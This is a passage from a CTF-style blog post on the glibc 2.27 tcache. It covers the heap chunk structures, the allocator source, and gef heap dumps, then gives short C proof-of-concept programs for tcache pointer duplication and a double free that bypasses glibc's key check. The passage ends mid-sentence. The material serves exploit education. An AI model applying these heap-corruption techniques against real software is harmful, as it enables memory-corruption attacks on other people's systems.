---
title: "Glibc 2.27 - 2.33 Tcache"
categories:
  - ctf
tags:
  - unix
  - pwn
---

## Explanation, Implementation, and Exploitation of Tcache

What is the Tcache, what purpose does it serve, and how can we exploit it??

To answer these questions, I will be going in detail on the following topics:

1. Tcache internals, glibc 2.27 - 2.33
2. Source code analysis, and the tcache's implementation across glibc 2.27 - 2.33
3. Exploitation techniques across glibc 2.27 - 2.33

The reason I will be creating a new post for glibc versions 2.27 and 2.33, is that the implementation
and function of the tcache will differ across each version. They have slight variations, like how
2.27 will prioritize the fastbin over the tcache, and how 2.33's tcache has essentially become the sole
caching mechanism for all. The other bins still serve a purpose in the optimization of our ptmalloc2
dynamic memory allocator, though not much as I will explain later.

## Glibc 2.27
Alright, lets first start of with an explanation of what the tcache is. Tcache, also known as "Thead
Local Cache" is a caching mechanism introduced in the release of glibc 2.26. One drawback of the
dynamic memory allocator known as dlmalloc was massive overhead when utilized with POSIX threads.

Thus, the release of ptmalloc/Posix Thread(aware) malloc had come prepared with several caching
mechanisms that had reduced the overhead caused by pthreads. As great as this caching layer for threading
is, the initial introduction had brought along several security vulnerabilities along with it.

Tcache will cache chunks between 24 and 1032 bytes in usable size, which is pretty massive in terms of
memory. The usage of the tcache differs between 2.27 and 2.33 as well, and the scenarios in which it will be chosen to cache freed chunks. I will be explaining this within the explanation section, so lets get
on with it :)

## Explanation 2.27
Lets take a look at the structures that define the tcache within glibc 2.27

```c
#define TCACHE_MAX_BINS 64

typedef struct tcache_entry {
  struct tcache_entry *next;
} tcache_entry;

typedef struct tcache_perthread_struct {
  char counts[TCACHE_MAX_BINS];
  tcache_entry *entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;
```

Something important that should be noted, is that there is a NEW tcache, for each thread. As we can see
by the name, "tcache_perthread_struct", 1 tcache, per thread. There will be 64 tcache bins per main
tcache table, and 7 entries per bin. I will explain this thoroughly here, so its okay to be a bit
confused, as this should hopefully all make sense in a bit.

The tcache is a structure that will contain an array of bins. These bins contain the tcache entries,
which will essentially be nodes that connect the singly linked list of freed chunks together. Saying
this in words will not really aid in the understanding of the tcache without prior knowledge, so lets
talk about chunk metadata.

My reasoning behind first explaining metadata, is the fact that everything will be built through chunk
metadata. This includes the caching of chunks within bins.

When we are to free a chunk, that does not ACTUALLY become deallocated, the program will simply
acknowledge the fact that you have no use for that chunk anymore. Lets take a look at what the
heap really is, and explain what and why is making it look so damn complicated.

```nasm
EXAMPLE HEAP:

0x55555555f000
     |              0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0
     |              0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0
     |              0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0
     |              0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0
     |              0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0
     |              0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x21000
     |              0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0
     |              0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0
     |              0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0
     |              0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0
     |              0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0

     - - - - - - - SNIP - - - - - - -

     |              0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0
     V
0x555555580000
```

This is an example of what the heap looks like, I did not worry about the specifics in how the heap
will grow upwards, or in how these addresses are not accurate. This is simply a little way to visualize
the heap within virtual memory.

As we can see, the little "0x21000" is the wilderness, in which we will discuss later. The important
thing to note is that the heap is not some spoopy scary convoluted and intricate mess of chunks
flying through memory, it is simply a massive block of free, global, and dynamic space for our program
to use.

So what the hell is the tcache, what are chunks? What happens when I allocate memory, and what happens
when i free it? how does any of this work, why am i screaming, god is dead!!!

I felt the same way when attempting to learn this, dont worry if you are confused. Everything takes
time, just continue to persist and you will come to understand it.

So, we have already established the fact that the heap is just a massive block of free memory for our
program to use correct? What happens when we malloc a small chunk?

lets take a look at the following program:

```c
#include <stdlib.h>
int main() {
    malloc(0);
}
```

okay, so lets take a look at what the chunk will look like after this allocation:

```nasm
0x0000000000000000 0x0000000000000021
0x0000000000000000 0x0000000000000000
0x0000000000000000
```

no need for a debugger, i have memorized what a 24 byte chunk will look like in my head

Okay, what is this, why does it look like that?

We have not written anything to this chunk yet, so the 24 bytes of usable memory are left untouched. We
know that the 3 "0x0000000000000000"'s after our strange 0x21 is our usabe chunk size by doing some
basic math. This is a 64 bit binary, so each address will contain 8 bytes worth of space, and we have
24 usable bytes of space correct?

So 24 / 8 will equals to 3.

That will be our space that we may write to, that will be the pointer that malloc returns. Then what
is that weird 0x21? And what is that strange 0x21 before it? That will be the chunk metadata, which
contains the necessary information for the entire ptmalloc dynamic memory ecosystem to operate.

Heres an interesting question, how many bytes does free() know how to free? How does it know the chunk
size?

Your choices are:
1. It fetches the sizeof() the pointer we pass to it
2. It will count the amount of bytes written to the address
3. It will become self aware of it's own dynamic memory, and free it however it sees fit

have you made your choice yet?

okaay, 3.. 2... 1......

bzzt! Its none of them!

Let me go through and explain why each of these will not work, lets start with number one:

"It fetches the sizeof() the pointer we pass to it"

This is incorrect, as sizeof() will find the size of the pointer we had passed to it, not the size of
the chunk. This is how sizeof works, it will not take the time and effort to go dereference whatever
the pointer is pointing to, it will simply return the size of the pointer we passed.

If we allocated an int* pointer to our malloc chunk, it will return the sizeof a pointer, which is 8
bytes on a 64 bit system. So number 1 was not the correct answer, lets take a look at number 2:

"It will count the amount of bytes written to the address"

The reasoning behind why this will be unsuccessful comes with a plethora of reasons. Some of these
include the fact that this will cause a massive case of chunk misalignemnt, everything will break,
everyone will die.

Another reason why this would not work is that it would cause a massive amount of overhead, which is
the main reason why ptmalloc was created in the first place. The goal of dynamic memory is to provide
(relatively) fast dynamic memory to the program whenever needed.

The third reason is self explanatory :/

Okay, so you've explained all the wrong reasons, what about the right one?

free() will know the chunk size to "free" from chunk metadata.
What is metadata you might be thinking, and let me explain this in terms that helped me personally.

This is very similar to photo metadata, in which each file format will contain information about the
photo taken. This may be an extremely vague example that introduces more questions than answers for
some people that lack prior knowledge, but it is the best example I can provide.

Here is the code that will define our chunk metadata:

```c
struct malloc_chunk {

  INTERNAL_SIZE_T      mchunk_prev_size;  /* Size of previous chunk (if free).  */

  INTERNAL_SIZE_T      mchunk_size;       /* Size in bytes, including overhead. */

  struct malloc_chunk* fd;                /* double links -- used only if free. */
  struct malloc_chunk* bk;


/* ----------------------------------------------------------------------------- */
  /* Only used for large blocks: pointer to next larger size.  */
  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
  struct malloc_chunk* bk_nextsize;

};
```
as we can see from this script, the only piece of metadata that will exist on an allocated chunk is the
mchunk_size field, which will contain the size of the current chunk. Lets take a look back at our
chunk metadata that was left when we allocated 24 bytes of usable space.

In 64 bit systems, a chunk's real size will equal to 32 bytes, including the space left for the metadata.
so lets check it, 0x21 in decimal is 33, 32 bytes if the usable chunk + metadata, and the extra byte is
a flag for the chunk.

These flags consists of the following:

### 0x1: PREV_INUSE:
This flag will be set if the previous chunk is in use.

### 0x2: IS_MMAPPED
This flag will be set if the chunk has been mmaped into memory rather than taken a piece off of the
heap. This means that free will munmap() the chunk, as opposed to caching it within a freelist bin.

### 0x4: NON_MAIN_ARENA
This flag will be set if the chunk is NOT in the main arena. We have not talked about this but we will
soon, as it is also extremely important. The arena was introduced with the release of ptmalloc2, and it
serves as a sort of virtual heap space for each thread. Each thread will have it's own arena, and if the
chunk does not reside within the main arena, this flag will be set.

Okay, we now understand why our chunk's metadata contained 0x21. It holds the size of the actual chunk,
lets take a look at a little visualization of it:

chunk:

```
[8 - metadata] [1 - flags] [24 - usable chunk]
```

okay, now we understand the metadata that makes up the chunk, but what about when its freed?

another thing that shoudl be noted is the fact that all caching bins will abide by the rules of the
chunk metadata structure, and this applies to the tcache as well.

Lets take a look at a chunk that has been freed:

```c
#include <stdlib.h>
int main() {
    void*ptr=(void*)malloc(0);
    void*ptr2=(void*)malloc(0);
    free(ptr);
    free(ptr2);
    getchar();
}
```

Lets take a look at what this chunk will look like AFTER it has been freed.

```nasm
gef➤  x/40gx 0x5555555592c0-64
0x555555559280: 0x0000000000000000      0x0000000000000000
0x555555559290: 0x0000000000000000      0x0000000000000021
0x5555555592a0: 0x0000000555555559      0x0000555555559010
0x5555555592b0: 0x0000000000000000      0x0000000000000021
0x5555555592c0: 0x000055500000c7f9      0x0000555555559010
0x5555555592d0: 0x0000000000000000      0x0000000000000411
0x5555555592e0: 0x0000000000000000      0x0000000000000000
0x5555555592f0: 0x0000000000000000      0x0000000000000000
0x555555559300: 0x0000000000000000      0x0000000000000000
0x555555559310: 0x0000000000000000      0x0000000000000000
0x555555559320: 0x0000000000000000      0x0000000000000000
0x555555559330: 0x0000000000000000      0x0000000000000000
0x555555559340: 0x0000000000000000      0x0000000000000000
0x555555559350: 0x0000000000000000      0x0000000000000000
0x555555559360: 0x0000000000000000      0x0000000000000000
0x555555559370: 0x0000000000000000      0x0000000000000000
0x555555559380: 0x0000000000000000      0x0000000000000000
0x555555559390: 0x0000000000000000      0x0000000000000000
0x5555555593a0: 0x0000000000000000      0x0000000000000000
0x5555555593b0: 0x0000000000000000      0x0000000000000000
gef➤
0x5555555593c0: 0x0000000000000000      0x0000000000000000
0x5555555593d0: 0x0000000000000000      0x0000000000000000
0x5555555593e0: 0x0000000000000000      0x0000000000000000
0x5555555593f0: 0x0000000000000000      0x0000000000000000
0x555555559400: 0x0000000000000000      0x0000000000000000
0x555555559410: 0x0000000000000000      0x0000000000000000
0x555555559420: 0x0000000000000000      0x0000000000000000
0x555555559430: 0x0000000000000000      0x0000000000000000
0x555555559440: 0x0000000000000000      0x0000000000000000
0x555555559450: 0x0000000000000000      0x0000000000000000
0x555555559460: 0x0000000000000000      0x0000000000000000
0x555555559470: 0x0000000000000000      0x0000000000000000
0x555555559480: 0x0000000000000000      0x0000000000000000
0x555555559490: 0x0000000000000000      0x0000000000000000
0x5555555594a0: 0x0000000000000000      0x0000000000000000
0x5555555594b0: 0x0000000000000000      0x0000000000000000
0x5555555594c0: 0x0000000000000000      0x0000000000000000
0x5555555594d0: 0x0000000000000000      0x0000000000000000
0x5555555594e0: 0x0000000000000000      0x0000000000000000
0x5555555594f0: 0x0000000000000000      0x0000000000000000
gef➤
0x555555559500: 0x0000000000000000      0x0000000000000000
0x555555559510: 0x0000000000000000      0x0000000000000000
0x555555559520: 0x0000000000000000      0x0000000000000000
0x555555559530: 0x0000000000000000      0x0000000000000000
0x555555559540: 0x0000000000000000      0x0000000000000000
0x555555559550: 0x0000000000000000      0x0000000000000000
0x555555559560: 0x0000000000000000      0x0000000000000000
0x555555559570: 0x0000000000000000      0x0000000000000000
0x555555559580: 0x0000000000000000      0x0000000000000000
0x555555559590: 0x0000000000000000      0x0000000000000000
0x5555555595a0: 0x0000000000000000      0x0000000000000000
0x5555555595b0: 0x0000000000000000      0x0000000000000000
0x5555555595c0: 0x0000000000000000      0x0000000000000000
0x5555555595d0: 0x0000000000000000      0x0000000000000000
0x5555555595e0: 0x0000000000000000      0x0000000000000000
0x5555555595f0: 0x0000000000000000      0x0000000000000000
0x555555559600: 0x0000000000000000      0x0000000000000000
0x555555559610: 0x0000000000000000      0x0000000000000000
0x555555559620: 0x0000000000000000      0x0000000000000000
0x555555559630: 0x0000000000000000      0x0000000000000000
gef➤
0x555555559640: 0x0000000000000000      0x0000000000000000
0x555555559650: 0x0000000000000000      0x0000000000000000
0x555555559660: 0x0000000000000000      0x0000000000000000
0x555555559670: 0x0000000000000000      0x0000000000000000
0x555555559680: 0x0000000000000000      0x0000000000000000
0x555555559690: 0x0000000000000000      0x0000000000000000
0x5555555596a0: 0x0000000000000000      0x0000000000000000
0x5555555596b0: 0x0000000000000000      0x0000000000000000
0x5555555596c0: 0x0000000000000000      0x0000000000000000
0x5555555596d0: 0x0000000000000000      0x0000000000000000
0x5555555596e0: 0x0000000000000000      0x0000000000020921
0x5555555596f0: 0x0000000000000000      0x0000000000000000
0x555555559700: 0x0000000000000000      0x0000000000000000
0x555555559710: 0x0000000000000000      0x0000000000000000
0x555555559720: 0x0000000000000000      0x0000000000000000
0x555555559730: 0x0000000000000000      0x0000000000000000
0x555555559740: 0x0000000000000000      0x0000000000000000
0x555555559750: 0x0000000000000000      0x0000000000000000
0x555555559760: 0x0000000000000000      0x0000000000000000
0x555555559770: 0x0000000000000000      0x0000000000000000
```

Now this output is pretty massive, so lets just look at the important part for now:

```nasm
0x555555559290: 0x0000000000000000      0x0000000000000021
0x5555555592a0: 0x0000000555555559      0x0000555555559010
0x5555555592b0: 0x0000000000000000      0x0000000000000021
0x5555555592c0: 0x000055500000c7f9      0x0000555555559010
0x5555555592d0: 0x0000000000000000      0x0000000000000411
0x5555555592e0: 0x0000000000000000      0x0000000000000000
```

as we can see, we have our usual 0x21 metadata, but it seems that our usable chunk area has been
overwritten with some weird addresses? Why is this happening?

So we already know the structure of the tcache bin, it will hold a counts of the amount of indexs, as
well as a pointer to the next free chunk within the tcache, to form a singly linked list.

We notice that there are 2 pointers to the same address @ 0x0000555555559010. What is this doing? Lets
check :)

```nasm
gef➤  x/x 0x0000555555559010
0x555555559010: 0x0000000000000002
gef➤
```

okay, so the value at the address is 2? What is this?

This is the count member of our tcache bin, which will hold the count of the chunks within the freelist.
As we know, we have allocated and freed 2 chunks. And the other strange address is the tcache next
pointer.

Now that we understand what the heap is during allocation, lets visualize what actually happens when
we free() a chunk.

First, we malloc a chunk size of 24 and memset the usable chunk area

```nasm
0x0:     0x0000000000000000 0x0000000000000021
0x1:     0x4141414141414141 0x4141414141414141
0x2:     0x4141414141414141 0x0000000000000000
0x3:     0x0000000000000000 0x0000000000000000
0x4:     0x0000000000000000 0x0000000000000000
0x5:     0x0000000000000000 0x0000000000000000
0x6:     0x0000000000000000 0x0000000000000000
0x7:     0x0000000000000000 0x0000000000000000
0x8:     0x0000000000000000 0x0000000000000000
0x9:     0x0000000000000000 0x0000000000000000
0xa:     0x0000000000000000 0x0000000000000000
0xb:     0x0000000000000000 0x0000000000000000
0xc:     0x0000000000000000 0x0000000000000000
0xd:     0x0000000000000000 0x0000000000000000
0xe:     0x0000000000000000 0x0000000000000000
0xf:     0x0000000000000000 0x000000000000000f
```

Okay, now lets free this chunk:

```nasm
0x0:     0x0000000000000000 0x0000000000000021
                +-------------------------------- tcache next ptr will point to 0x1, where the junk lies
                V
0x1:     0xcafef00db33fdead 0xdeadbeefcafebabe <- pointer to count
0x2:     0x4141414141414141 0x0000000000000000
0x3:     0x0000000000000000 0x0000000000000000
0x4:     0x0000000000000000 0x0000000000000000
0x5:     0x0000000000000000 0x0000000000000000
0x6:     0x0000000000000000 0x0000000000000000
0x7:     0x0000000000000000 0x0000000000000000
0x8:     0x0000000000000000 0x0000000000000000
0x9:     0x0000000000000000 0x0000000000000000
0xa:     0x0000000000000000 0x0000000000000000
0xb:     0x0000000000000000 0x0000000000000000
0xc:     0x0000000000000000 0x0000000000000000
0xd:     0x0000000000000000 0x0000000000000000
0xe:     0x0000000000000000 0x0000000000000000
0xf:     0x0000000000000000 0x000000000000000f
```

Nice, so after this operation has been completed, the chunk is officially stored within the tcache bin
for later use. Some of these demos may not have been completely accurate, as within glibc 2.27 the
free mechanism will prioritize the fastbin over the tcache for a low quantity of frees.

Keep this in mind when working with different glibc versions, always check to see which bin your freed
chunk will end up in.

## Implementation 2.27
Okay, now that we understand the Thread Local Caching layer for glibc's ptmalloc, lets begin the source
code analysis to reveal any underlying features of the tcache. We want to know how everything will work
in tandem with each other, as we still dont know what the code for this while tcache caching layer looks
like yet.

Learning the implementation of a certain technology you are attempting to exploit is mandatory in my
opinion, so lets get started.

```c
#if USE_TCACHE

typedef struct tcache_entry {
  struct tcache_entry *next;
} tcache_entry;

typedef struct tcache_perthread_struct {
  char counts[TCACHE_MAX_BINS];
  tcache_entry *entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;

static __thread bool tcache_shutting_down = false;
static __thread tcache_perthread_struct *tcache = NULL;
```

Here we have our usual tcache structures that define everything. We have already gone over this, so I
wont be explaining this.

```c
#ifndef INTERNAL_SIZE_T
# define INTERNAL_SIZE_T size_t
#endif

#define SIZE_SZ (sizeof (INTERNAL_SIZE_T))

/* ---- snip ---- */

#define chunk2mem(p)   ((void*)((char*)(p) + 2*SIZE_SZ))
#define mem2chunk(mem) ((mchunkptr)((char*)(mem) - 2*SIZE_SZ))

/* ---- snip ---- */

/* Caller must ensure that we know tc_idx is valid and there's room
   for more chunks.  */

static __always_inline void
tcache_put (mchunkptr chunk, size_t tc_idx) {
  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
  assert (tc_idx < TCACHE_MAX_BINS);
  e->next = tcache->entries[tc_idx];
  tcache->entries[tc_idx] = e;
  ++(tcache->counts[tc_idx]);
}
```
Before we get started on the tcache put function, let me first elaborate on these important preprocessor
macros as they directly influence our understanding of what the program is doing. Lets first start of
with the first definition, of INTERNAL_SIZE_T.

This macro seems to simply hold the size_t data type, which is an unsigned integer capable of holding
integer values in range of (0, SIZE_MAX). This seems simple, but there this macro is used often so there
is much more that it defines or sets for malloc.

The macro will be used to define the word size for each chunk size. This size will differ between 32
and 64 bit systems, as does each and every integer. We will see this macro a bunch from here on out, so
just remember that it will be a 64 bit unsigned integer, on 64 bit systems.

the SIZE_SZ macro is simply the sizeof INTERNAL_SIZE_T, which will be 8 bytes. This will simply hold the
size of the INTERNAL_SIZE_T macro, lets move on.

Next, we have our chunk2mem macro function, this will utilize the SIZE_SZ macro, and will be used
within the tcache_put function, so lets go over what it will do. As we can see, chunk2mem will take a
pointer, dereference it with a char data type, then dereference as a void ptr. This will essentially
attempt to first dereference (p + 8) with a char pointer. Then, cast void pointer onto it.

Finally, we have the tcache_put function, it will take 2 parameters for this function. It will take a
pointer to the chunk we want to cache within the tcache freelist, and it will contain a tcache index.
This does 2 things, it will allow the tcache to sort the chunk by bin, and will also define the size
of the chunk.

Since each bin is indexed by size, then if we were to pass the index to what bin we want to cache this
chunk in, we now also know the size of the chunk.

Alright, so the function will then allocate a new tcache entry by converting the chunk we had passed
to the function into memory. It will then call an assert statement making sure that the index passed
to the tcache is still within the range of the max tcache size, which is 64.

Then, it will simply update the data, and insert/append our node/entry into the tcache linked list. This
is standard data structures stuff, so I will not be explaining the concept of linked lists in this
post but you are free to research creation, insertion, reversal, searching, sorting, and deletion of
singly and or doubly linked lists in your free time.

Then, it will properly incrememnt the count of our tcache bin.

```c
/* Caller must ensure that we know tc_idx is valid and there's
   available chunks to remove.  */

static __always_inline void *
tcache_get (size_t tc_idx)
{
  tcache_entry *e = tcache->entries[tc_idx];
  assert (tc_idx < TCACHE_MAX_BINS);
  assert (tcache->entries[tc_idx] > 0);
  tcache->entries[tc_idx] = e->next;
  --(tcache->counts[tc_idx]);
  return (void *) e;
}
```

Next, we have the tcache_get function, which will retrieve an entry from the linked list, and return
a pointer to it. The comment on the top is simply informing us that this function does not have
much checking put in place. So the caller of the function will have to make sure that chunk exists
within the tcache freelist.

Okay, first it will construct a pointer to the entry that we want to retrieve from the bin. It will
then add some assert checks to make sure everything is within bounds, and will then retrieve the entry
without destroying the linked list.

Lastly, it will decrement the counts of the tcache, and will return a void pointer to the entry we
removed from the tcache freelist. Not so bad, so these two functions will handle the insertion and
removal of chunks into and from the tcache.

Next we have the free() source code, I have trimmed out the parts that did not relate to the tcache,
and this was the result. Lets walk through this:

```c
static void
_int_free (mstate av, mchunkptr p, int have_lock)
{
  INTERNAL_SIZE_T size;        /* its size */
  mfastbinptr *fb;             /* associated fastbin */
  mchunkptr nextchunk;         /* next contiguous chunk */
  INTERNAL_SIZE_T nextsize;    /* its size */
  int nextinuse;               /* true if nextchunk is used */
  INTERNAL_SIZE_T prevsize;    /* size of previous contiguous chunk */
  mchunkptr bck;               /* misc temp for linking */
  mchunkptr fwd;               /* misc temp for linking */

  size = chunksize (p);

  /* Little security check which won't hurt performance: the
     allocator never wrapps around at the end of the address space.
     Therefore we can exclude some size values which might appear
     here by accident or by "design" from some intruder.  */

  if (__builtin_expect ((uintptr_t) p > (uintptr_t) -size, 0)
      || __builtin_expect (misaligned_chunk (p), 0))
    malloc_printerr ("free(): invalid pointer");

  /* We know that each chunk is at least MINSIZE bytes in size or a
     multiple of MALLOC_ALIGNMENT.  */

  if (__glibc_unlikely (size < MINSIZE || !aligned_OK (size)))
    malloc_printerr ("free(): invalid size");

  check_inuse_chunk(av, p);

#if USE_TCACHE
  {
    size_t tc_idx = csize2tidx (size);

    if (tcache
	&& tc_idx < mp_.tcache_bins
	&& tcache->counts[tc_idx] < mp_.tcache_count)
      {
	tcache_put (p, tc_idx);
	return;
      }
  }
#endif
}
 ---- snip ----
```

First, free will initialize pointers so it is able to read the heap metadata and work according to what
it sees. Everything here, we have talked about when we spoke about the chunk structure, so I will not
be going over that.

Next, we have a little security check that attempts to validate whether the pointer passed to free is
of valid size and or address.

Next, we get to the important part, which is where the tcache has been implemented within free. Here
is where free() will attempt to store chunks within the tcache freelist, so lets walk through this.

first, it will find the size of the chunk, and convert it into an index for the bin. This is due to
each bin being indexed by size.

Next, it will check if the tcache exists, and if the tcache bins exist, and if the index's counts is
less than the tcache count. It will essentially place a bunch of checks in place, and then insert the
pointer into the index entry into the tcache.

This is the important piece of code within the free function, that concerns the tcache. When a chunk
has been freed, it will simply just cache the chunk, if the "USE_TCACHE" is set.

Next, we have our big malloc function, lets walk through this one as well, i have kept only the
important pieces of code that pertain to the tcache.

```c
 static void *
 _int_malloc (mstate av, size_t bytes)
 {

 ---- snip ----

 #if USE_TCACHE
   size_t tcache_unsorted_count;     /* count of unsorted chunks processed */
 #endif

 ---- snip ----

 #if USE_TCACHE
           /* While we're here, if we see other chunks of the same size,
              stash them in the tcache.  */
           size_t tc_idx = csize2tidx (nb);
           if (tcache && tc_idx < mp_.tcache_bins)
             {
               mchunkptr tc_victim;

               /* While bin not empty and tcache not full, copy chunks over.  */
               while (tcache->counts[tc_idx] < mp_.tcache_count
                      && (pp = *fb) != NULL)
                 {
                   REMOVE_FB (fb, tc_victim, pp);
                   if (tc_victim != 0)
                     {
                       tcache_put (tc_victim, tc_idx);
                     }
                 }
             }
 #endif
```

the first piece of code that will mention the tcache will simply initialize the tcache_unsorted_count
as an unsigned long. Next, it will use a mechanism in which it will copy the chunks from the fastbin
over into the tcache, in reverse order.

The reasoning behind it copying it back in reverse order is not exactly a preference, as much as it
is an inherent trait that LIFO singly linkled lists posess. I had talked about this relationship between
the tcache and fastbin during my explanation of the fastbin_reverse_into_tcache.

anyways, lets move onto the next snippet of code

```c
 #if USE_TCACHE

   INTERNAL_SIZE_T tcache_nb = 0;
   size_t tc_idx = csize2tidx (nb);
   if (tcache && tc_idx < mp_.tcache_bins)
     tcache_nb = nb;
   int return_cached = 0;

   tcache_unsorted_count = 0;
 #endif

 ---- snip ----

 #if USE_TCACHE
               /* Fill cache first, return to user only if cache fills.
                  We may return one of these chunks later.  */
               if (tcache_nb
                   && tcache->counts[tc_idx] < mp_.tcache_count)
                 {
                   tcache_put (victim, tc_idx);
                   return_cached = 1;
                   continue;
                 }
               else
                 {
 #endif
```

This will create a size_t variable called tcache_nb, then convert chunk size into bin index. If the
tcache exists, and if the tcache index is less than the total amount of tcache bins, then set
the variable tcache_nb to nb. Then also set return_cached to 0, and tcache_unsorted_count to 0.

Then, if the tcache_nb is set, and the counts are not out of bounds, it will then place the victim
chunk into the tcache, at the provided index. No, this is not a POC for demoing a new house of
exploitation technique, this pointer is actually named victim within the glibc source code.

```c
 #if USE_TCACHE
       /* If we've processed as many chunks as we're allowed while
          filling the cache, return one of the cached ones.  */
       ++tcache_unsorted_count;
       if (return_cached
           && mp_.tcache_unsorted_limit > 0
           && tcache_unsorted_count > mp_.tcache_unsorted_limit)
         {
           return tcache_get (tc_idx);
         }
 #endif

 ---- snip ----

 #if USE_TCACHE
       /* If all the small chunks we found ended up cached, return one now.  */
       if (return_cached)
         {
           return tcache_get (tc_idx);
         }
 #endif
```

This code will determine whether or not to fetch and return chunks from the tcache. We do not have the
context in which mp_ is, but we can form an educated guess based on the fact that it is using the
tcache_get() function. This will probably be the checks put in place to make sure the chunks are valid
before attempting to fetch from the tcache freelist.

## Exploitation 2.27

In the exploitation section of this post; I will be detailing a few techniques found within the how2heap
repository. Eventually we will be completing pwnable.tw's tcache_tear, which incorporates a double
free within tcache to gain arbitrary write, and a tcache house of spirit to leak the address of the
main arena.

Lets get started :)

### Tcache Dup
This technique involves a simple pointer duplication that may lead to arbitrary writes. We can leverage
the tcache in this case to duplicate our pointer. In order to perform this attack, we must possess the
ability to edit a free chunk, whether that be a heap overflow or a use after free.

These bug classes may cause extreme security implications, as the dynamic memory ecosystem must rely
completely and blindly on the metadata that is provided. They may attempt to validate the metadata, but
that has its shortcomings as well.

Anyways, lets get onto the demonstration, this is the script that we will be using:

```c
#include <stdio.h>
#include <stdlib.h>
int main(int argc,char**argv) {
    fprintf(stderr,"This technique may lead to arbitrary writes\nafter this we just need a where :(\n");
    void*a=(void*)malloc(56),*b=(void*)malloc(56),*c;
    free(a);
    *(unsigned long*)a = (unsigned long)b;
    fprintf(stderr,"a = %p @ %p\n",*(unsigned long*)a,a);
    fprintf(stderr,"b = %p @ %p\n",*(unsigned long*)b,b);
    fprintf(stderr,"Now lets malloc 1 more chunk, and see what pointer we get returned\n");
    c=(void*)malloc(56);
    fprintf(stderr,"c = %p @ %p\n",*(unsigned long*)c,c);
    fprintf("And just like that, we have duplicated a pointer!");
}
```

As we can see, it will allocate 2 chunks, both with a size of 56. Then, we will free the "a" pointer.
This freed chunk will "reside" within the tcache as an entry. Then, we will simply overwrite a's next
pointer within the tcache freelist with a pointer to b.

The reason for the strange "*(unsigned long*)" casting, is due to the fact that we have chosen a void
pointer to represent our "data". In order to actually access this value, and dereference a void pointer
we need to cast a data type on it. We want full addresses, so we have chosen to use a 64 bit unsigned
integer to represent the data.

If we are to check the value of the next pointer on "a", it will seemingly point to b, which means we
now have 2 pointers to this free chunk. We do not need to overwrite this next pointer to a chunk's
location, in fact we can overwrite this next pointer with ANYTHING.

This means that when we malloc a chunk of the same size again, it will return a pointer to wherever
we overwrote the next pointer with, and enable us to get an arbitrary write. For the demonstration
purposes, we have chosen to overwrite "a"'s next pointer, to point to b.

The important thing to note here, is that a simple tcache_dup will not work in glibc 2.27 anymore. It
was also removed from how2heap's repository during the course of writing this post. I am not going to
remove it, as it demonstrates an extremely simple; yet interesting technique that may improve our
understanding in the other areas as well.

### Tcache Double Free
This is an interesting technique, and will give us the ability to achieve the same write what where
primitive that the tcache_dup gave us, except the fact that this technique works on the latest version
of glibc.

The essence of this technique is to successfully bypass any checks present to prevent double frees, so
we can achieve a write what where by duplicating a pointer. Lets see a little script I wrote to help
demonstrate how this attack works

```c
#include <stdio.h>
#include <stdlib.h>
int main(){
    void*a=(void*)malloc(136),*b=(void*)malloc(136);
    fprintf(stderr,"Allocating chunks\na: %p\nb: %p\nLets free \"a\" now",a,b);
    free(a);    // free 1
    fprintf(stderr,"\"a\" has been freed, we can no longer free it without tcache_put() aborting");
    fprintf(stderr,"\
\n\
Lets take a look at the structure of the tcache entry again:\n\n\
typedef struct tcache_entry {\n\
    struct tcache_entry *next;\n\
    struct tcache_perthread_struct *key;\n\
} tcache_entry;\n\n");
    fprintf(stderr,"As we can see, there seems to be a \"key\" pointer, what we need to overwrite");
    fprintf(stderr,"This is just a POC, so I will not be explaining here, details will be explained on the blog");
    *(unsigned long*)(a+8)=0x1234;
    fprintf(stderr,"Poisoned tcache entry key pointer:\na->key = %p\nWe can now call free again!",*(unsigned long*)(a+8));
    free(a);    // free 2
    fprintf(stderr,"We have now freed the same chunk twice!\nLets take a look at the state of the tcache\n");
    fprintf(stderr,"\
\n\
entry1:            entry2:\n\
[next: %p][key] -> [next: %p][key]\n\
        |                      |\n\
        |                      V\n\
        +-----------------> 0x1234\n\
\n\
   struct __thread tcache_perthread_struct* tcache;\n",a,a);
    fprintf(stderr,"And we successfully achieve a double free within the latest tcache!");
}
```

Okay, so this script that i hacked together simply demonstrates the overwriting of the key value within
our tcache free chunk to bypass the double free checking. Lets first find the code in which free will
detect if our chunk has been double freed:

```c
tcache_put(mchunkptr chunk, size_t tc_idx) {
  tcache_entry *e = (tcache_entry *)chunk2mem(chunk);
  e->key = tcache;
  e->next = tcache->entries[tc_idx];
  tcache->entries[tc_idx] = e;
  ++(tcache->counts[tc_idx]);
}
```

as we can see, this code will take a pointer to an allocated chunk that is in the process of being
freed. If the use of tcache definition is set, then it will use the tcache_put() function to insert
and allocate the new entry into the tcache freelist.

We have already spoken about this, so we will just briefly give an overview of the new tcache key
member we see within the entry. The function will set the new entry's key to point to the main tcache
per thread structure.

How this is utilized to detect double frees, we will see in the free() implementation, but this code
is important in establishing what the key member will actually point to.

```c
int free() {
    size_t tc_idx = csize2tidx (size);
    if (tcache != NULL && tc_idx < mp_.tcache_bins) {

    tcache_entry *e = (tcache_entry *) chunk2mem (p);

    if (__glibc_unlikely (e->key == tcache)) {
        tcache_entry *tmp;
        LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);
        for (tmp = tcache->entries[tc_idx];
         tmp;
         tmp = tmp->next)
          if (tmp == e)
        malloc_printerr ("free(): double free detected in tcache 2");
      }
    if (tcache->counts[tc_idx] < mp_.tcache_count)
      {
        tcache_put (p, tc_idx);
        return;
      }
      }
  }
```
First, the free function will check if the chunk already exists within the tcache, if everything is ok
then it will allocate a new entry in which to store this new chunk.

This is the important part, in which it checks if the provided entry's key points to the tcache. If it
